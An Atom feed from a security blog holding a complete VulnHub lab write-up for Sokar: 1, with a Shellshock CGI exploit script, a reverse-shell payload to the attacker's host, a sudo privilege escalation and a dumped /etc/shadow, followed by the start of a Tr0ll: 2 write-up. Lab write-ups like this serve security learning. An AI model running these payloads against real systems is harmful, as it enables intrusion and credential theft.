<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-07-07T03:42:48-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Sokar: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1/"/>
    <updated>2015-07-07T02:41:59-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1</id>
    <content type="html"><![CDATA[<p>Sokar is created by <a href="http://rastamouse.me/">Rasta Mouse</a> and it also is the first competition in 2015 run by VulnHub team.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sokar-1,113/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.145/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Shellshock (Bash bug) give attacker a way to break in and also get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Shellshock vulnerability detect and check [<font color="FF8000">wget</font>]</li>
<li>Analysis and write script to exploit shellshock bug</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get reverse shell</li>
<li>Exploit shellshock bug to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.145 in this case).</p>

<p><img class="left" src="/downloads/Sokar1/1.png"></p>

<p>10.10.10.145 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, found apache 2.2.15 is running on port 591 and the target OS is CentOS Linux.</p>

<p><code>nmap -sV -v -O -A -T5 -p- 10.10.10.145</code></p>

<p><img class="left" src="/downloads/Sokar1/2.png"></p>

<p>Then I open iceweasel browser to have a close look at port 591.</p>

<p><img class="left" src="/downloads/Sokar1/3.png"></p>

<p>From the content displayed, we know the server is running system command: <code>netstat</code> and <code>iostat</code></p>

<p>From the source code, we found an URL: <code>http://10.10.10.145:591/cgi-bin/cat</code></p>

<h3>It&rsquo;s time to try shellshock (bash bug)</h3>

<p>After googled <code>shellshock</code>, I found some topics talking about how to test/exploit shellshock vulnerability in CGI. The following command is picked from <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">one</a> of them.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U &ldquo;() { test;};echo \"Content-type: text/plain\&rdquo;; echo; echo; /bin/cat /etc/passwd" &lt;a href="http://10.10.10.145:591/cgi-bin/cat">http://10.10.10.145:591/cgi-bin/cat&lt;/a> -O /temp.txt</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Sokar1/4.png"></p>

<p>It works! shellshock vulnerable. Also, two users found: <code>bynarr</code> and <code>apophis</code></p>

<p>Here I wrote a small python script to save my life.</p>

<p><figure class='code'><figcaption><span>sokar.py  (sokar.py)</span> <a href='/downloads/code/sokar.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">str_usage</span> <span class="o">=</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">str_example</span> <span class="o">=</span> <span class="s">&quot;Example: </span><span class="si">%s</span><span class="s"> </span><span class="se">\&quot;</span><span class="s">/bin/cat /etc/passwd</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.145&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">591</span>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="s">&quot;/cgi-bin/cat&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_usage</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_example</span>
</span><span class='line'>	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the following exp is used to write reverse shell code into the file /home/bynarr/iostat</span>
</span><span class='line'><span class="c">#exp = &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/echo -e &#39;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">exp</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;test&quot;</span><span class="p">:</span><span class="n">exp</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">reason</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>by using <code>sokar.py</code> script, I poked around the system and found something interesting.</p>

<p><img class="left" src="/downloads/Sokar1/5.png"></p>

<p><img class="left" src="/downloads/Sokar1/6.png"></p>

<p>Here we go, I got the password (<font color="red"><em>fruity</em></font>) for user <code>bynarr</code> and notice that we only can got out to port <font color="red">51242</font> from the server.</p>

<p><img class="left" src="/downloads/Sokar1/7.png"></p>

<p>Another notice, <code>.</code> has been set in environment variable <code>$PATH</code>, which means when run a program the system will check the current user path first. This leave us a chance to hijack the program and make a reverse shell back to my Kali.</p>

<p>Then I changed the exp payload in my python script to write a bash script into /home/bynarr/iostat (iostat is the hijack target).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;()</span> <span class="p">{</span> <span class="n">test</span><span class="p">;};</span><span class="n">echo</span> \<span class="s">&quot;Content-type: text/plain\&amp;rdquo;; echo; echo; /bin/echo -e &amp;lsquo;#!/bin/bash</span><span class="se">\n</span><span class="s">/bin/bash -i &gt;&amp;amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;amp;1&amp;rsquo; &gt; /home/bynarr/iostat&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use my script to grant the new fake <code>iostat</code> to executable.</p>

<p><img class="left" src="/downloads/Sokar1/8.png"></p>

<p>Now setup <code>NC</code> on my Kali to listen on port <font color="red">51242</font>, after waiting for seconds, I got a shell with <em>bynarr</em> privilege!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvnp 51242
</span><span class='line'>listening on [any] 51242 &hellip;
</span><span class='line'>connect to [10.10.10.131] from (UNKNOWN) [10.10.10.145] 56650
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>[bynarr@sokar ~]$ id
</span><span class='line'>id
</span><span class='line'>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
</span><span class='line'>[bynarr@sokar ~]$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[bynarr@sokar ~]$ cat /proc/version
</span><span class='line'>cat /proc/version
</span><span class='line'>Linux version 2.6.32-504.1.3.el6.x86_64 (&lt;a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x6d;&#x6f;&#99;&#107;&#x62;&#117;&#x69;&#108;&#100;&#64;&#99;&#54;&#x62;&#x39;&#46;&#98;&#115;&#x79;&#115;&#46;&#100;&#x65;&#x76;&#x2e;&#99;&#x65;&#110;&#116;&#x6f;&#115;&#46;&#111;&#x72;&#103;">&#x6d;&#x6f;&#99;&#107;&#x62;&#117;&#105;&#108;&#x64;&#64;&#x63;&#x36;&#98;&#x39;&#46;&#98;&#115;&#121;&#115;&#x2e;&#x64;&#101;&#118;&#x2e;&#99;&#101;&#x6e;&#x74;&#111;&#x73;&#x2e;&#x6f;&#114;&#103;&lt;/a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-11) (GCC) ) #1 SMP Tue Nov 11 17:57:25 UTC 2014
</span><span class='line'>[bynarr@sokar ~]$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 48
</span><span class='line'>drwxrwxrwx. 2 bynarr bynarr  4096 Jul  7 17:20 .
</span><span class='line'>drwxr-xr-x. 4 root   root    4096 Dec 30  2014 ..
</span><span class='line'>-rw&mdash;&mdash;-. 1 bynarr bynarr  4982 Jul  7 17:13 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   178 Nov 12  2014 .bash_profile
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
</span><span class='line'>-rwxr-xr-x  1 apache apache    61 Jul  7 16:09 iostat
</span><span class='line'>-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
</span><span class='line'>-rw&mdash;&mdash;-  1 root   root   10728 Nov 13  2014 lime.ko</span></code></pre></td></tr></table></div></figure></p>

<p>I run command <code>sudo -l</code> to check the allowed commands for user bynarr.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for bynarr on this host:
</span><span class='line'>    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&ldquo;COLORS
</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&rdquo;, env_keep+=&ldquo;MAIL PS1
</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&rdquo;, env_keep+=&ldquo;LC_COLLATE
</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&rdquo;, env_keep+=&ldquo;LC_MONETARY
</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&rdquo;, env_keep+=&ldquo;LC_TIME LC_ALL
</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&rdquo;,
</span><span class='line'>    secure_path=/sbin:/bin:/usr/sbin:/usr/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>User bynarr may run the following commands on this host:
</span><span class='line'>    (ALL) NOPASSWD: /home/bynarr/lime
</span><span class='line'>[bynarr@sokar ~]$ sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo: sorry, you are not allowed to set the following environment variables: LANG</span></code></pre></td></tr></table></div></figure></p>

<p>From the output, I noticed that executable program lime is owned by root but <em>bynarr</em> can run it.</p>

<p>Due to the server is vulnerable to shellshock, I use the following command (found in <a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">here</a>) to double check if it can be exploited locally.</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ env x=&lsquo;() { :;}; echo vulnerable&rsquo; bash -c &ldquo;echo this is a test&rdquo;
</span><span class='line'>&lt; { :;}; echo vulnerable' bash -c &ldquo;echo this is a test&rdquo;                    &lt;br/>
</span><span class='line'>vulnerable
</span><span class='line'>this is a test</span></code></pre></td></tr></table></div></figure></p>

<p>Yes it is vulnerable! From the previous <code>sudo -l</code> output, there are couple of environment variables can be used to exploit.</p>

<p>Here I use variable <code>HOSTNAME</code>.</p>

<p><code>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>the password for bynarr is <code>fruity</code> which we found it before.</p>

<p>Now we get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
</span><span class='line'>[root@sokar bynarr]# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>[root@sokar bynarr]# pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[root@sokar root]#cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
</span><span class='line'>bin:&lt;em>:15628:0:99999:7:::
</span><span class='line'>daemon:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>adm:&lt;em>:15628:0:99999:7:::
</span><span class='line'>lp:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>sync:&lt;em>:15628:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>halt:&lt;em>:15628:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>uucp:&lt;em>:15628:0:99999:7:::
</span><span class='line'>operator:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>games:&lt;em>:15628:0:99999:7:::
</span><span class='line'>gopher:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>&lt;a href="ftp:*:15628:0:99999:7:::">ftp:*:15628:0:99999:7:::&lt;/a>
</span><span class='line'>nobody:*:15628:0:99999:7:::
</span><span class='line'>vcsa:!!:16386::::::
</span><span class='line'>saslauth:!!:16386::::::
</span><span class='line'>postfix:!!:16386::::::
</span><span class='line'>sshd:!!:16386::::::
</span><span class='line'>bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
</span><span class='line'>apache:!!:16386::::::
</span><span class='line'>apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
</span><span class='line'>[root@sokar bynarr]# cd /root
</span><span class='line'>cd /root
</span><span class='line'>[root@sokar root]# ls
</span><span class='line'>ls
</span><span class='line'>build.c  flag
</span><span class='line'>[root@sokar root]# cat flag
</span><span class='line'>cat flag
</span><span class='line'>                0   0
</span><span class='line'>                |   |
</span><span class='line'>            &lt;em>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/em>&lt;strong>&lt;em>
</span><span class='line'>         0  |~ ~ ~ ~ ~ ~|   0
</span><span class='line'>         |  |   Happy   |   |
</span><span class='line'>      &lt;/em>&lt;/strong>|&lt;strong>|&lt;/strong>&lt;strong>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>      |/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>  0   |    B i r t h d a y    |   0
</span><span class='line'>  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
</span><span class='line'> &lt;/em>|&lt;/em>&lt;/strong>|&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>|                                   |
</span><span class='line'>|     V  u  l  n  H  u  b   ! !     |
</span><span class='line'>| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
</span><span class='line'>|&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>_________________|&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;table>
</span><span class='line'>&lt;thead>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;th> Congratulations on beating Sokar! &lt;/th>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/thead>
</span><span class='line'>&lt;tbody>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>  Massive shoutout to g0tmi1k and  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td> the entire community which makes  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>         VulnHub possible!         &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>                                   &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/tbody>
</span><span class='line'>&lt;/table>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;h1>|    rasta_mouse (@_RastaMouse)     |&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Tr0ll: 2]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2/"/>
    <updated>2015-06-24T04:31:06-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2</id>
    <content type="html"><![CDATA[<p>&ldquo;The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</p>

<p>Difficulty is beginner++ to intermediate.&ldquo; &ndash; <font color="green">Maleus</font> (<a href="www.overflowsecurity.com">www.overflowsecurity.com</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.141/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture</li>
<li>Weak passwords used in FTP, login and download suspect encrypted zip file</li>
<li>Cracked the zip file with downloaded dictionary file and found user &lsquo;noob&rsquo; and his SSH private key file</li>
<li>Shellshock bug give attacker a way to break in</li>
<li>Buffer Overflow analysis and exploit to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Analysis and write script to check folder list found in &lsquo;robots.txt&rsquo;</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from four different folders and reveal the hidden information stored in one of the pictures</li>
<li>Found the hidden folder and download a base64 encoded file from it, after decoded it, that should be a dictionary file</li>
<li>Try the weak passwords for FTP login and found one works (Tr0ll / Tr0ll)</li>
<li>Downloaded encrypted zip file through FTP and crack it with dictionary file found before [<font color="FF8000">fcrackzip</font>]</li>
<li>Exploit shellshock bug with noob&rsquo;s private key file to break into the target machine</li>
<li>Look around and found suspicious program with SUID bit set under the path &lsquo;/nothing_to_see_here/choose_wisely/&rsquo;</li>
<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://oldhome.schmorp.de/marc/fcrackzip.html">fcrackzip</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.141 in this case).</p>

<p><img class="left" src="/downloads/Tr0ll2/1.png"></p>

<p>10.10.10.141 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 21, 22 and 80 have been discovered running on Ubuntu Linux.
<code>nmap -sV -v -O -A -T5 -p- 10.10.10.141</code></p>

<p><img class="left" src="/downloads/Tr0ll2/2.png"></p>

<p>Next, I run nikto scan on port 80 to check if there is any web vulnerability.</p>

<p><img class="left" src="/downloads/Tr0ll2/3.png"></p>

<p>Nothing too exciting, but noticed that <code>robots.txt</code> found without <code>disallow</code> which is odd. As a result, I open iceweasel browser to have a close look at robots.txt.</p>

<p><img class="left" src="/downloads/Tr0ll2/4.png"></p>

<p>Here I wrote a python script to check all of the directories in <code>robots.txt</code> and filter out working directories then saved in a file.</p>

<p><figure class='code'><figcaption><span>robot_check.py  (robot_check.py)</span> <a href='/downloads/code/robot_check.py'>download</a></figcaption>
